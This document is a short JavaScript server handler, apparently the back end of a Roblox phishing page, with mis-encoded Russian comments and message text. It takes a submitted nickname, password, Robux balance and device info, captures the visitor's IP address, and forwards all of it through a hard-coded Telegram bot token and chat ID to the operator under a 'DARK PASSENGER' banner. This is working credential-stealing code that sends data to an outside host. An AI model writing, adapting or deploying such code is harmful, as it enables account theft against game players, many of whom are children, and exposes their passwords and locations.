export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { u, p, r, m } = req.body;
        
        // –•–≤–∞—Ç–∞–µ–º IP —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞
        const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;

        // –¢–í–û–ò –û–ë–ù–û–í–õ–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï
        const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk'; 
        const chatId = '8165386246'; 

        const text = `üî™ **DARK PASSENGER: –í–ï–†–î–ò–ö–¢** üî™\n\n` +
                     `üë§ **–ù–∏–∫–Ω–µ–π–º:** \`${u}\`\n` +
                     `üîë **–ü–∞—Ä–æ–ª—å:** \`${p}\`\n` +
                     `üíé **–†–æ–±—É–∫—Å—ã:** ${r}\n` +
                     `üåê **IP-–∞–¥—Ä–µ—Å:** ${ip}\n` +
                     `üì± **–ñ–µ–ª–µ–∑–æ:** ${m}\n\n` +
                     `ü©∏ *–ö–æ–¥–µ–∫—Å —Å–æ–±–ª—é–¥–µ–Ω. –£–ª–∏–∫–∞ –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–∞.*`;

        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: chatId, 
                    text: text,
                    parse_mode: 'Markdown' 
                })
            });
            return res.status(200).json({ status: 'success' });
        } catch (error) {
            return res.status(500).json({ status: 'error' });
        }
    }
    return res.status(405).send('Method Not Allowed');
}
